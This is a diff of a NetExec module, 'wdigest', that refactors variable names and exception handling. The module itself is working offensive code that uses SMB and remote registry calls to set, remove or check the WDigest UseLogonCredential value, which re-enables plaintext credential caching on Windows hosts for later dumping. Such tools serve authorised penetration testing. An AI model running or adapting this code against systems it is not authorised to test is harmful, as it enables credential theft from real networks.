@@ -6,8 +6,8 @@ from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
 from sys import exit
 
-class NXCModule:
 
+class NXCModule:
     name = "wdigest"
     description = "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
     supported_protocols = ["smb"]
@@ -38,65 +38,65 @@ class NXCModule:
             self.wdigest_check(context, connection.conn)
 
     def wdigest_enable(self, context, smbconnection):
-        remoteOps = RemoteOperations(smbconnection, False)
-        remoteOps.enableRegistry()
+        remote_ops = RemoteOperations(smbconnection, False)
+        remote_ops.enableRegistry()
 
-        if remoteOps._RemoteOperations__rrp:
-            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
-            regHandle = ans["phKey"]
+        if remote_ops._RemoteOperations__rrp:
+            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
+            reg_handle = ans["phKey"]
 
             ans = rrp.hBaseRegOpenKey(
-                remoteOps._RemoteOperations__rrp,
-                regHandle,
+                remote_ops._RemoteOperations__rrp,
+                reg_handle,
                 "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
             )
-            keyHandle = ans["phkResult"]
+            key_handle = ans["phkResult"]
 
             rrp.hBaseRegSetValue(
-                remoteOps._RemoteOperations__rrp,
-                keyHandle,
+                remote_ops._RemoteOperations__rrp,
+                key_handle,
                 "UseLogonCredential\x00",
                 rrp.REG_DWORD,
                 1,
             )
 
-            rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UseLogonCredential\x00")
+            rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
 
             if int(data) == 1:
                 context.log.success("UseLogonCredential registry key created successfully")
 
         try:
-            remoteOps.finish()
-        except:
+            remote_ops.finish()
+        except Exception:
             pass
 
     def wdigest_disable(self, context, smbconnection):
-        remoteOps = RemoteOperations(smbconnection, False)
-        remoteOps.enableRegistry()
+        remote_ops = RemoteOperations(smbconnection, False)
+        remote_ops.enableRegistry()
 
-        if remoteOps._RemoteOperations__rrp:
-            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
-            regHandle = ans["phKey"]
+        if remote_ops._RemoteOperations__rrp:
+            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
+            reg_handle = ans["phKey"]
 
             ans = rrp.hBaseRegOpenKey(
-                remoteOps._RemoteOperations__rrp,
-                regHandle,
+                remote_ops._RemoteOperations__rrp,
+                reg_handle,
                 "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
             )
             keyHandle = ans["phkResult"]
 
             try:
                 rrp.hBaseRegDeleteValue(
-                    remoteOps._RemoteOperations__rrp,
+                    remote_ops._RemoteOperations__rrp,
                     keyHandle,
                     "UseLogonCredential\x00",
                 )
-            except:
+            except Exception:
                 context.log.success("UseLogonCredential registry key not present")
 
                 try:
-                    remoteOps.finish()
-                except:
+                    remote_ops.finish()
+                except Exception:
                     pass
 
                 return
@@ -104,7 +104,7 @@ class NXCModule:
             try:
                 # Check to make sure the reg key is actually deleted
                 rtype, data = rrp.hBaseRegQueryValue(
-                    remoteOps._RemoteOperations__rrp,
+                    remote_ops._RemoteOperations__rrp,
                     keyHandle,
                     "UseLogonCredential\x00",
                 )
@@ -112,23 +112,23 @@ class NXCModule:
                 context.log.success("UseLogonCredential registry key deleted successfully")
 
                 try:
-                    remoteOps.finish()
-                except:
+                    remote_ops.finish()
+                except Exception:
                     pass
 
     def wdigest_check(self, context, smbconnection):
-        remoteOps = RemoteOperations(smbconnection, False)
-        remoteOps.enableRegistry()
+        remote_ops = RemoteOperations(smbconnection, False)
+        remote_ops.enableRegistry()
 
-        if remoteOps._RemoteOperations__rrp:
-            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
-            regHandle = ans["phKey"]
+        if remote_ops._RemoteOperations__rrp:
+            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
+            reg_handle = ans["phKey"]
 
-            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest")
-            keyHandle = ans["phkResult"]
+            ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest")
+            key_handle = ans["phkResult"]
 
             try:
-                rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "UseLogonCredential\x00")
+                rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                 if int(data) == 1:
                     context.log.success("UseLogonCredential registry key is enabled")
                 else:
@@ -139,6 +139,6 @@ class NXCModule:
                 else:
                     context.log.fail("UseLogonCredential registry key not present")
             try:
-                remoteOps.finish()
-            except:
+                remote_ops.finish()
+            except Exception:
                 pass
